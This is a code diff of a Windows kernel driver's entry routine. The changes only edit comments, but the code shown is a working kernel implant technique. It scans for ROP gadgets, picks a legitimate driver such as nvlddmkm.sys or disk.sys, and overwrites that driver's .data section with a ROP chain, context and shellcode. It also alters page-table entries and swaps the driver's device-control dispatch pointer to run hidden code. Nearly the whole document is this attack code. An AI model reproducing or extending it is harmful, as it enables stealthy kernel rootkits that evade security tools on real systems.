@@ -1,12 +1,12 @@
 #include "Utils.h"
 #include "Payload.h"
 
-// --- Configuration ---
+//Configuration
 const char* TARGET_CANDIDATES[] = {
     "nvlddmkm.sys", "rt640x64.sys", "disk.sys", "storport.sys"
 };
 
-// --- Main Stomping Logic ---
+//Stomping Logic
 extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
     UNREFERENCED_PARAMETER(DriverObject);
     UNREFERENCED_PARAMETER(RegistryPath);
@@ -26,21 +26,21 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
         return STATUS_UNSUCCESSFUL;
     }
 
-    // --- Robust Gadget Discovery Block ---
-    // 1. POP RCX
+    //Gadget Discovery
+    // POP RCX
     uint64_t g_PopRcx = FindPattern(textSectionAddr, textSectionSize, "\x59\xC3", "xx");
 
-    // 2. POP RAX
+    // POP RAX
     uint64_t g_PopRax = FindPattern(textSectionAddr, textSectionSize, "\x58\xC3", "xx");
 
-    // 3. AND [RCX], RAX (Dynamic Fallback)
+    // AND [RCX], RAX
     uint64_t g_AndRcxRax = FindPattern(textSectionAddr, textSectionSize, "\x48\x21\x01\xC3", "xxxx");
     if (!g_AndRcxRax) {
         DbgPrint("[!] Primary AndRcxRax failed. Trying 32-bit operand variant...\n");
         g_AndRcxRax = FindPattern(textSectionAddr, textSectionSize, "\x21\x01\xC3", "xxx");
     }
 
-    // 4. INVLPG [RCX] (Dynamic Fallback)
+    // INVLPG [RCX]
     uint64_t g_Invlpg = FindPattern(textSectionAddr, textSectionSize, "\x0F\x01\x39\xC3", "xxxx");
     if (!g_Invlpg) {
         DbgPrint("[!] Primary Invlpg failed. Trying non-ret variant...\n");
@@ -54,7 +54,7 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
     }
     DbgPrint("[+] Gadgets Found. Building ROP Chain.\n");
 
-    // 3. Find Target Driver (.data stomp)
+    // Find Target Driver stomp
     uint64_t targetBase = 0;
     uint64_t dataSectionAddr = 0;
     uint32_t dataSize = 0;
@@ -87,8 +87,8 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
         return STATUS_UNSUCCESSFUL;
     }
 
-    // 4. Construct the Payload Layout
-    // MEMORY LAYOUT: [ROP_CHAIN] + [SHELLCODE_CTX] + [CovertEntry Code]
+    // Construct the Payload Layout
+    // MEMORY LAYOUT = [ROP_CHAIN] + [SHELLCODE_CTX] + [CovertEntry Code]
     uint64_t ropSize = sizeof(ROP_CHAIN);
     uint64_t ctxSize = sizeof(SHELLCODE_CTX);
     uint64_t codeSize = (uint64_t)CovertEntryEnd - (uint64_t)CovertEntry;
@@ -103,7 +103,7 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 
     if (!mapped) return STATUS_UNSUCCESSFUL;
 
-    // --- A. Build ROP Chain ---
+    // Build ROP Chain
     ROP_CHAIN rop = { 0 };
     rop.PopRcx = g_PopRcx;
     rop.PteAddress = GetPteAddress(dataSectionAddr);
@@ -117,8 +117,8 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
 
     memcpy(mapped, &rop, ropSize);
 
-    // --- B. Build Context ---
-    // ctx is declared here to avoid "undeclared identifier" errors
+    // B. Build Context
+    // ctx is declared
     SHELLCODE_CTX ctx = { 0 };
     ctx.PteAddress = rop.PteAddress;
     ctx.OriginalDispatch = (uint64_t)targetDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL];
@@ -127,14 +127,14 @@ extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Reg
     // Copy populated context into stomped memory
     memcpy(mapped + ropSize, &ctx, ctxSize);
 
-    // --- C. Copy Shellcode ---
+    // Copy Shellcode
     memcpy(mapped + ropSize + ctxSize, (void*)CovertEntry, codeSize);
 
     MmUnmapLockedPages(mapped, mdl);
     IoFreeMdl(mdl);
 
-    // 5. Install the Hook (Point to ROP Chain Start)
-    // We swap the original dispatch pointer with the address of our ROP chain
+    // Install the Hook (Point to ROP Chain Start)
+    // original dispatch pointer swapped with the address of our ROP chain
     InterlockedExchangePointer((PVOID*)&targetDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL], (PVOID)dataSectionAddr);
 
     DbgPrint("[+] ROP Stomp Complete.\n");
